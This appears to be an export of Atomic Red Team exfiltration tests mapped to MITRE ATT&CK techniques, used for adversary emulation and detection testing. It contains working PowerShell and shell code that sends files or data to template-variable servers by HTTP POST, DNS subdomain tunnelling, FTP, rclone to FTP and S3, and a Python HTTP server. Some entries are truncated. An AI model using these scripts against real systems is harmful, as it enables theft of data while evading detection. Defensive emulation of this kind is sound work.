scripts.id: ART - T1020 - IcedID Botnet HTTP PUT
scripts.name: ART - T1020 - IcedID Botnet HTTP PUT
scripts.description:
Creates a text file
Tries to upload to a server via HTTP PUT method with ContentType Header
Deletes a created file

scripts.command:

$url = "#{art_exfil_1020_domain}"

scripts.id: ART - T1030 - Network-Based Data Transfer in Small Chunks
scripts.name: ART - T1030 - Network-Based Data Transfer in Small Chunks
scripts.description: Simulate transferring data over a network in small chunks to evade detection.
scripts.technique_name: Network-Based Data Transfer in Small Chunks
scripts.command:
$file = [System.IO.File]::OpenRead(#{art_exfil_1030_source_file_path})
$chunkSize = #{art_exfil_1030_chunk_size} * 1KB
$buffer = New-Object Byte[] $chunkSize

while ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {
    $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)
    Invoke-WebRequest -Uri #{art_exfil_1030_destination_url} -Method Post -Body $encodedChunk
}
$file.Close()
scripts.detection_rule: See MITRE ATT&CK page for detection guidance

scripts.id: ART - T1041 - Text Based Data Exfiltration using DNS subdomains
scripts.name: ART - T1041 - Text Based Data Exfiltration using DNS subdomains
scripts.description: Simulates an adversary using DNS tunneling to exfiltrate data over a Command and Control (C2) channel.
scripts.technique_name: Text Based Data Exfiltration using DNS subdomains
scripts.command:
$dnsServer = "#{art_exfil_1041_dns_server}"
$exfiltratedData = "#{art_exfil_1041_exfiltrated_data}"
$chunkSize = #{art_exfil_1041_chunk_size}

$encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)
$encodedData = [Convert]::ToBase64String($encodedData)
$chunks = $encodedData -split "(.{$chunkSize})"

foreach ($chunk in $chunks) {
    $dnsQuery = $chunk + "." + $dnsServer
    Resolve-DnsName -Name $dnsQuery
    Start-Sleep -Seconds 5
}
scripts.detection_rule: See MITRE ATT&CK page for detection guidance

scripts.id: ART - T1048.003 - MAZE FTP Upload
scripts.name: ART - T1048.003 - MAZE FTP Upload
scripts.description:
This test simulates MAZE's ransomware's ability to exfiltrate data via FTP.
Upon successful execution, all 7z files within the %windir%\temp directory will be uploaded to a remote FTP server. 
Reference: https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomw...
scripts.technique_name: MAZE FTP Upload
scripts.command:
$Dir_to_copy = "$env:windir\temp"
$ftp = "ftp://#{art_exfil_1048_003_ftp_server}/"
$web_client = New-Object System.Net.WebClient
$web_client.Credentials = New-Object System.Net.NetworkCredential('#{art_exfil_1048_003_username}', '#{art_exfil_1048_003_password}')
if (test-connection -count 1 -computername "#{art_exfil_1048_003_ftp_server}" -quiet)
{foreach($file in (dir $Dir_to_copy "*.7z"))
{echo "Uploading $file..."
$uri = New-Object System.Uri($ftp+$file.name)
$web_client.UploadFile($uri, $file.FullName)}}
else
{echo "FTP Server Unreachable. Please verify the server address in input args and try again."}
scripts.cleanup_command:
$ftp = "ftp://#{art_exfil_1048_003_ftp_server}/"
try {foreach ($file in (dir "$env:windir\temp" "*.7z"))
{$uri = New-Object System.Uri($ftp+$file.name)
 $ftp_del = [System.Net.FtpWebRequest]::create($uri)
 $ftp_del.Credentials = New-Object System.Net.NetworkCredential('#{art_exfil_1048_003_username}','#{art_exfil_1048_003_password}')
 $ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile
 $ftp_del.GetResponse()}} catch{}
scripts.detection_rule: See MITRE ATT&CK page for detection guidance

scripts.id: ART - T1048.003 - Exfiltration Over Alternative Protocol - FTP - Rclone

[Reference](https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/)
scripts.technique_name: Exfiltration Over Alternative Protocol - FTP - Rclone
scripts.command:
$rclone_bin = Get-ChildItem C:\Users\Public\Downloads\ -Recurse -Include "rclone.exe" | Select-Object -ExpandProperty FullName
$exfil_pack = Get-ChildItem C:\Users\Public\Downloads\ -Recurse -Include "exfil.zip" | Select-Object -ExpandProperty FullName
&$rclone_bin config create ftpserver "ftp" "host" #{art_exfil_1048_003_ftp_server} "port" #{art_exfil_1048_003_ftp_port} "user" #{art_exfil_1048_003_ftp_user} "pass" #{art_exfil_1048_003_ftp_pass}
&$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate
scripts.detection_rule: See MITRE ATT&CK page for detection guidance

scripts.id: ART - T1048.003 - Python3 http.server
scripts.name: ART - T1048.003 - Python3 http.server
scripts.description: An adversary may use the python3 standard library module http.server to exfiltrate data. This test checks if python3 is available and if so, creates a HTTP server on port 9090, captures the PID, sleeps for 10 seconds, then kills the PID and unsets the $PID variable.
scripts.technique_name: Python3 http.server
scripts.command:
[ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9
if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
scripts.detection_rule: See MITRE ATT&CK page for detection guidance

scripts.id: ART - T1567.002 - Exfiltrate data with rclone to cloud Storage - AWS S3
scripts.name: ART - T1567.002 - Exfiltrate data with rclone to cloud Storage - AWS S3
scripts.description:
This test uses rclone to exfiltrate data to a remote cloud storage instance. (AWS S3)
See https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/
scripts.technique_name: Exfiltrate data with rclone to cloud Storage - AWS S3
scripts.command:
Write-Host "Deploying AWS infrastructure... " -NoNewLine
$awsAccessKey = "#{art_exfil_1567_002_aws_access_key}"
$awsSecretKey = "#{art_exfil_1567_002_aws_secret_key}"
cd PathToAtomicsFolder/T1567.002/src/
if ($awsAccessKey -eq "" -or $awsSecretKey -eq "") {
  $env:AWS_PROFILE = "#{art_exfil_1567_002_aws_profile}"
} else {
  $env:AWS_ACCESS_KEY_ID = "$awsAccessKey"
  $env:AWS_SECRET_ACCESS_KEY = "$awsSecretKey"
}
$null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform init
$null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform apply -var "aws_region=#{art_exfil_1567_002_aws_region}" -auto-approve
Write-Host "Done!"
Write-Host "Generating rclone config... " -NoNewLine
$config = @"
[exfils3]
type = s3
provider = AWS
env_auth = true
region = #{art_exfil_1567_002_aws_region}
"@
$config | Out-File -FilePath "PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf" -Encoding ascii
Write-Host "Done!"
Write-Host "Exfiltrating data... " -NoNewLine
$bucket = "$(PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform output bucket)".Replace("`"","")
cd PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone-v*
$null = ./rclone copy --max-size 1700k "PathToAtomicsFolder/../ExternalPayloads/T1567.002/data/" exfils3:$bucket --config "PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf"
Write-Host "Done!"
